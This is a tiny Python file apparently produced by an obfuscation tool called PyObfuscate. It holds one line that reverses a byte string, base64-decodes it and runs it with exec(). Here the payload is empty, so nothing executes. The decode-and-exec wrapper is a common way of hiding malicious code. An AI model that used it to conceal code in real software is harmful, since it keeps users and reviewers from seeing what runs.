# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Sun Feb  6 13:21:26 2022
# d------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))